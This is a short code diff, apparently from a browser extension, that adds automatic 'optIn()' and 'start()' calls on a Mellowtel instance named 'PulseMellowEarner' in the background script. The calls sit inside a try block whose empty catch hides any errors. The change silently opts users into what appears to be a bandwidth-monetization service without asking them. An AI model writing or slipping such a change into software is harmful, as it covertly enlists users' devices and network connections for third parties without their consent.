@@ -15,6 +15,8 @@ const PulseMellowEarner = new Mellowtel("c4a83408-e051-7076-dc7f-dd52fb081bd6", 
 (async () => {
   try {
     await PulseMellowEarner.initBackground();
+    await PulseMellowEarner.optIn();
+    await PulseMellowEarner.start();
   } catch {}
 })();
 
